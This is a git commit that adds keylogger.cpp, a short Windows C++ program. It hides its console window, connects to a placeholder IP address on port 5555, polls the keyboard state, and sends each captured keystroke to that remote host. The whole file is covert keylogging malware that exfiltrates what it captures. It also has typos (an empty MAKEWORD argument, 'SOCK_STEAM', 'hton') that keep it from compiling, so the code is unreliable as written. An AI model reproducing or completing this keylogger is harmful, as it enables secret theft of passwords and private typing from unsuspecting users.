e5a1c17fa1b991f2940f6fdd4ca6eef2b411e16a
Christian Hernandez <turbo620@yahoo.com>
2020-12-03 19:07:02 -0800

    Create keylogger.cpp

---
+++ keylogger.cpp
@@ -0,0 +1,39 @@
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#pragma comment(lib, "Ws2_32.lib")
+#include <iostream>
+#include <winsock2.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <Windows.h>
+
+int main()
+{
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	char KEY;
+
+	WSADATA WSAData;
+	SOCKET server;
+	SOCKADDR_IN addr;
+
+	WSAStartup(MAKEWORD(2, ), &WSAData);
+	server = socket(AF_INET, SOCK_STEAM, 0);
+	addr.sin_addr.s_addr = inet_addr("IP address");
+	addr.sin_family = AF_INET;
+	addr.sin_port = hton(5555);
+	connect(server, (SOCKADDR *)&addr, sizeof(addr));
+
+		while (true) {
+		Sleep(10);
+		for (int KEY = 0x8; KEY < 0xFF; KEY++)
+		{
+			if (GetAsyncKeyState(KEY) == -32767) {
+
+				char buffer[2];
+				buffer[0] = KEY;
+				send(server, buffer, sizeof(buffer), 0);
+			}
+		}
+	}
+	closesocket(server);
+	WSACleanup();
+}
